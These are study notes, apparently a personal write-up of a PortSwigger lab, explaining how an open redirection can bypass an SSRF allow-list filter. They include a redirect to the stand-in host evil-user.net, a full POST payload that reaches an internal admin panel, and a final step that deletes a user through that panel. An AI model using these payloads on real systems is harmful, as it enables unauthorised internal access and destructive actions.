<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Bypassing SSRF filters via open redirection</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Bypassing SSRF filters via open redirection</h1><br/><br />The application whose URLs are allowed could contain an open redirection vulnerability. <br />Provided the API used to make the back-end HTTP request supports redirections, you can construct a URL that satisfies the filter and results in a redirected request to the desired back-end target.<br /><br /><span style="color:#865e3c;">example:</span><br />Suppose the application contains an open redirection vulnerability in which the following URL:<br /><div class="codebox"><pre>/product/nextProduct?currentProductId=6&amp;path=http://evil-user.net</pre></div><br />returns a redirection to:<br /><div class="codebox"><pre>http://evil-user.net</pre></div><br />You can leverage the open redirection vulnerability to bypass the URL filter, and exploit the SSRF vulnerability as follows:<br /><div class="codebox"><pre>POST /product/stock HTTP/1.0<br />Content-Type: application/x-www-form-urlencoded<br />Content-Length: 118<br /><br />stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&amp;path=http://192.168.0.68/admin</pre></div><br /><br />This SSRF exploit works because the application first validates that the supplied stockAPI URL is on an allowed domain, which it is. The application then requests the supplied URL, which triggers the open redirection. It follows the redirection, and makes a request to the internal URL of the attacker&#39;s choosing.<br /><br /><br /><strong><span style="color:#865e3c;">Exercise:</span></strong><br />1. Search for possible open redirections<br />2. Click &quot;next product&quot; and observe that the <code>path</code> parameter is placed into the Location header of a redirection response, <br />	<strong>resulting in an open redirection</strong><br />   <a href=""><img src="images/2237-1.png" alt="images/2237-1.png" /></a><br />3. Check if with the open redirection we can arrive to a backed server<br />   <a href=""><img src="images/2237-2.png" alt="images/2237-2.png" /></a><br />	YES<br />	<br />4. Change the request in a POST, use the <code>stockApi</code> parameter on the stock checker as seen also before in <a href="erver-side--Server_Side_Attacks--Server_Side_Request_Forgery_(SSRF)--Bypass_common_SSRF_defenses--SSRF_with_whitelist-based_input_filters.html">SSRF with whitelist-based input filters</a><br />	<code>/product/nextProduct?currentProductId=2&amp;path=</code><code><span style="color:#e01b24;">http://192.168.0.12:8080/admin</span></code><br />	<a href=""><img src="images/2237-3.png" alt="images/2237-3.png" /></a><br />	probably as seen in the chapter before is because we need to URL encode the post parameter stockApi<br />	<a href=""><img src="images/2237-4.png" alt="images/2237-4.png" /></a><br />	Yes the Admin Page is been Rendered<br />	<a href=""><img src="images/2237-5.png" alt="images/2237-5.png" /></a><br />5. Amend the path to delete the target user:<br />	<code>/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos</code><br />	<a href=""><img src="images/2237-6.png" alt="images/2237-6.png" /></a><br />	<a href=""><img src="images/2237-7.png" alt="images/2237-7.png" /></a><br /><br /><strong>Bibliography:</strong><br /><a href="https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection">https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection</a></div>
</body>
</html>
